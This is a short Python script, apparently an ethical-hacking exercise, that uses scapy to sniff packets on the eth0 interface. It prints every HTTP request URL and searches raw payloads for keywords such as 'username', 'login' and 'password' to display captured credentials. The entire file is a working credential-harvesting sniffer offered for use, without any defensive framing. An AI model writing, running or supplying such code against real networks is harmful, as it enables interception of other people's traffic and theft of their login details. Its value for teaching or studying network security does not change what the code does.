#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
# works in python 2 or 3
# starts collecting responses from interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# displays absolute url
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# checks layers of requests for login and password requests
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["uid", "username", "user", "login", "password", "pass", "account_subdomain"]
        for keyword in keywords:
            if keyword in load:
                return load

# displays the url and possible credentials
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible credentials > " + login_info + "\n\n")

#calls main functions which has callback to begin sniffing information
sniff("eth0")
